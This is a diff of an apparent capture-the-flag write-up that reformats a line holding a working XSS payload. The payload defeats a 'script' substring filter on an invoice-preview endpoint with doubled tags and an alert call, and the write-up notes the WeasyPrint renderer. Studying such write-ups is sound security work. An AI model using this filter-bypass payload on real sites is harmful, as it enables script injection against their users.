@@ -480,7 +480,9 @@ after a while i found that the application is detecting substring of `script` an
 
 to close tag i can use `<script/style>` so we can close the style tag and do something else, on  the preview i got an xss using this payload :
 
-    http://IP_ADDR:8663/invoices/preview?d={%20%22companyName%22:%20%22Hackerone%22,%20%22email%22:%20%22administrator@hackerone.com%22,%20%22invoiceNumber%22:%20%221337%22,%20%22date%22:%20%221337-1337-01%22,%20%22items%22:%20[%20[%221%22,%20%22%22,%20%22%22,%20%2210%22]%20],%20%22styles%22:%20{%20%22body%22:%20{%20%22background-color%22:%20%22white%22,%20%22%3Cscript/style%3E%3Cscrscriptipt%3Ealescriptrt(1337);%3Cscript/scrscriptipt%3E%3Ch2%20id=%27result%27%3Ex%3Cscript/h2%3E%22:%22x%22%20}%20}%20}
+```
+http://IP_ADDR:8663/invoices/preview?d={%20%22companyName%22:%20%22Hackerone%22,%20%22email%22:%20%22administrator@hackerone.com%22,%20%22invoiceNumber%22:%20%221337%22,%20%22date%22:%20%221337-1337-01%22,%20%22items%22:%20[%20[%221%22,%20%22%22,%20%22%22,%20%2210%22]%20],%20%22styles%22:%20{%20%22body%22:%20{%20%22background-color%22:%20%22white%22,%20%22%3Cscript/style%3E%3Cscrscriptipt%3Ealescriptrt(1337);%3Cscript/scrscriptipt%3E%3Ch2%20id=%27result%27%3Ex%3Cscript/h2%3E%22:%22x%22%20}%20}%20}
+```
 
 tried to embed an image and i got response from the server which say the user agent `weasyprint 44`
 
